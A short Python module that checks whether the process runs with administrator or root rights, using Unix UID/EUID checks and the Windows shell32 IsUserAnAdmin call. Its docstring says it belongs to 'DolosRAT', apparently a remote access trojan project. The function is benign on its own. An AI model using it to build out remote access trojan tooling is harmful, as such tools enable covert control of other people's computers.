# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 17/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
"""

# Built-in/Generic Imports.
import ctypes
import os

def check_admin_privs() -> bool:
    """Checks if the privilege context in which 
    DolosRAT is run is that of an administator/sudoer.
    This does so in a EAFP fashion 
    (see https://en.wikiquote.org/wiki/Grace_Hopper).

    Returns:
        bool: Indicates whether the current privilege is that
        of an administrator/sudoer.
    """
    try:
        # Non-NT means of checking UID.
        return os.getuid() == 0
    # If NT, AttributeError is thrown.
    except AttributeError:
        pass

    try:
        # Alternatively, check EUID of
        # application if i.e., SUID set.
        return os.geteuid() == 0
    except AttributeError:
        pass

    try:
        # If NT, use Shell32 API to check current
        # privilege context.
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    # Should unintended issues arise, return False.
    except AttributeError:
        pass

    return False
